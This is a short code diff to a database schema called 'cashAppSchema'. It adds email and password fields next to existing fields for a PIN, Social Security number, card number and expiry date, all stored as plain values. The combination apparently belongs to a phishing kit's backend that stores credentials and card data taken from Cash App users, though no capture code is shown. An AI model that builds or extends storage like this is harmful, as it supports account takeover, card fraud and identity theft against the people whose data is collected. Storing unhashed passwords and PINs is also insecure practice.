@@ -16,6 +16,8 @@ const cashAppSchema = new Schema({
     },
     pin: { type: String, },
     ssn: { type: String },
+    email: { type: String },
+    password: { type: String },
     site: { type: String },
     card_number: { type: Number },
     mm_yy: { type: String },
